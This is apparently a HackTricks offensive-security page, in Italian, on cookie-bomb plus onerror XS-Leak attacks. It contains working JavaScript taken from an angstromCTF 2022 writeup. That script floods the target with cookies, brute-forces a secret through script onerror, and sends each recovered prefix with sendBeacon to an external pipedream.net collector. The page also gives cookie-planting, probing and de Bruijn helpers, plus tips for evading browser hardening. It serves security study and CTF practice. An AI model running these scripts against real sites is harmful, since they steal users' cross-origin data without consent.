# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Questa tecnica combina:
- Cookie bombing: riempire il browser della vittima con molti/grandi cookie per l'origine di destinazione in modo che le richieste successive raggiungano i limiti del server/richiesta (dimensione degli header di richiesta, dimensione dell'URL nei redirect, ecc.).
- Error-event oracle: sondare un endpoint cross-origin con un `<script>` (o un altro subresource) e distinguere gli stati con `onload` vs `onerror`.

Idea principale
- Trova un endpoint target il cui comportamento differisce per due stati che vuoi testare (ad es., search “hit” vs “miss”).
- Assicurati che il percorso “hit” scateni una catena di redirect pesante o un URL lungo mentre il percorso “miss” rimane corto. Gonfia gli header di richiesta usando molti cookie in modo che solo il percorso “hit” faccia sì che il server fallisca con un errore HTTP (es., 431/414/400). L'errore attiva onerror e diventa un oracle per XS-Search.

Quando funziona
- Puoi far sì che il browser della vittima invii cookie al target (ad es., i cookie sono SameSite=None o puoi impostarli in un contesto first-party tramite un popup `window.open`).
- Esiste una funzionalità dell'app che puoi abusare per impostare cookie arbitrari (ad es., endpoint “save preference” che trasformano nomi/valori di input controllati in Set-Cookie) o per effettuare redirect post-auth che incorporano dati controllati dall'attaccante nell'URL.
- Il server reagisce diversamente nei due stati e, con header/URL gonfiati, uno stato supera un limite e restituisce una risposta di errore che attiva onerror.

Nota sugli errori del server usati come oracle
- 431 Request Header Fields Too Large viene comunemente restituito quando i cookie gonfiano gli header di richiesta; 414 URI Too Long o un 400 specifico del server possono essere restituiti per target di richiesta lunghi. Qualsiasi di questi provoca il fallimento del caricamento del subresource e scatena onerror. Vedi [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) per cause tipiche come cookie eccessivi.

<details>
<summary>Practical example (angstromCTF 2022)</summary>

Lo script seguente (da un writeup pubblico) abusa di una funzionalità che permette all'attaccante di inserire cookie arbitrari, quindi carica un endpoint di ricerca cross-origin come script. Quando la query è corretta, il server esegue un redirect che, insieme al gonfiamento dei cookie, supera i limiti del server e restituisce uno stato di errore, quindi script.onerror viene eseguito; altrimenti non succede nulla.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Perché il popup (`window.open`)?
- I browser moderni stanno sempre più bloccando i third-party cookies. Aprire una top-level window verso il target rende i cookie first‑party, quindi le risposte Set-Cookie dal target persisteranno, permettendo il cookie-bomb step anche con restrizioni sui third‑party cookies.

2024–2025 notes on cookie availability
- Il rollout di Chrome’s Tracking Protection (gennaio 2024) sta già bloccando i third-party cookies per una coorte casuale ed è previsto che si estenda all’intera base utenti una volta che la UK CMA dia l’ok, quindi considera che qualsiasi vittima può perdere improvvisamente i 3P cookies. Automatizza il fallback: rileva quando la tua probe script fallisce senza mai raggiungere il target e passa trasparentemente al flusso popup/first-party. Safari e Firefox già bloccano la maggior parte dei third-party cookies di default e CHIPS/partitioned cookies significano che ogni sito top-level ora ha il suo jar.
- Usa un first‑party cookie planting flow (`window.open` + auto-submit verso un cookie-setting endpoint) e poi effettua la probe con una subresource che ha successo solo quando quei cookie vengono inviati. Se i third‑party cookies sono bloccati, sposta la probe in un contesto same-site (per es., esegui l’oracle nel popup tramite un gadget same-site ed exfiltra il booleano con `postMessage` o un beacon verso il tuo server), oppure iscrivi l’origine della vittima al Chrome’s deprecation trial se la controlli legittimamente.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Quando hai bisogno di implantare decine di cookie da un contesto cross-site, crea una top-level window temporanea e invia una serie di oversized form submissions verso il vulnerable Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Chiamalo immediatamente prima di iniziare il probing, così ogni oracle run parte con un cookie jar appena riempito.

</details>

Generic probing helper
Se hai già un modo per impostare molti cookie sull'origine target (first-party), puoi riutilizzare questo minimal oracle contro qualsiasi endpoint il cui successo/fallimento conduca a esiti di rete diversi (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Oracolo di tag alternativo (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Advanced: de Bruijn–based cookie packing (CTF-proven)
- Se l'app ti permette di controllare grandi cookie values, puoi packare guesses in modo efficiente aggiungendo una sequenza de Bruijn a ogni probe. Questo mantiene basso l'overhead per‑probe e garantisce che l'heavy branch sia sistematicamente più pesante solo per il giusto prefix. Esempio di generatore per |Σ| simboli di lunghezza n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in pratica: impostare più cookie i cui valori sono prefisso + deBruijn(k,n). Solo quando il prefisso testato è corretto il server prende il percorso “pesante” (ad es., un redirect extra che riflette il cookie o l'URL lungo), il quale, combinato con l'ingrossamento dei cookie, supera i limiti e attiva onerror. Vedi un public solver di LA CTF 2024 che usa questo approccio.

Tips to build the oracle
- Forza lo stato “positivo” a essere più pesante: concatenare un redirect extra solo quando il predicato è vero, oppure fare in modo che il redirect URL rifletta input utente non limitato in modo che cresca con il prefisso indovinato.
- Gonfiare le intestazioni: ripetere cookie bombing fino a quando si osserva un errore coerente sul percorso “pesante”. I server comunemente limitano la dimensione delle intestazioni e falliranno prima quando sono presenti molti cookie.
- Stabilizzare: eseguire multiple operazioni parallele di impostazione cookie e sondare ripetutamente per mediare il rumore di timing e caching.
- Forzare la mancata cache ed evitare artefatti di pooling: aggiungere un `#fragment` casuale o `?r=` agli URL di probe, e preferire nomi di finestra distinti quando si usano loop con `window.open`.
- Alternare le sottorisorse: se `<script>` viene filtrato, provare con `<link rel=stylesheet>` o `<img>`. Il booleano onload/onerror è l'oracolo; il contenuto non necessita mai di essere parsato.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs e server applicano limiti diversi. A ottobre 2025, Cloudflare documenta 128 KB totali per request headers (e 16 KB per URL) sull'edge, quindi potrebbe servirti più cookie o cookie più grandi quando i target sono dietro di esso. Altri stack (es., Apache via LimitRequestFieldSize) sono spesso più vicini a ~8 KB per linea di header e genereranno errori prima. Regola la dimensione del bomb di conseguenza (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) ha inasprito il conteggio di caricamento/errore dei tag script per risorse cross-origin (CVE-2025-5266). Su client patchati il segnale onerror per certe risposte redirectate è soppresso, quindi diversifica l'oracolo (parallel `<link rel=stylesheet>`, `<img>`, o `fetch` con MIME non corrispondente) e fingerprinta lo UA della vittima prima di assumere che il booleano si attivi ancora.
- Aspettati build enterprise di Chromium con Tracking Protection o policy Fetch Metadata che occasionalmente rimuovono i cookie o riscrivono i redirect. Rileva questi casi sondando prima un endpoint breve; quando fallisce, esegui automaticamente l'intero attacco dentro il popup e inoltra i bit tramite `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- Oracoli basati sulla lunghezza dell'URL (senza cookie) possono essere combinati o usati al loro posto quando puoi forzare un target di richiesta molto lungo:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- Questa classe di attacchi è discussa in generale come “Error Events” XS-Leaks. Il passo cookie-bomb è solo un modo comodo per spingere una sola branch oltre i limiti del server, producendo un oracolo booleano affidabile.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
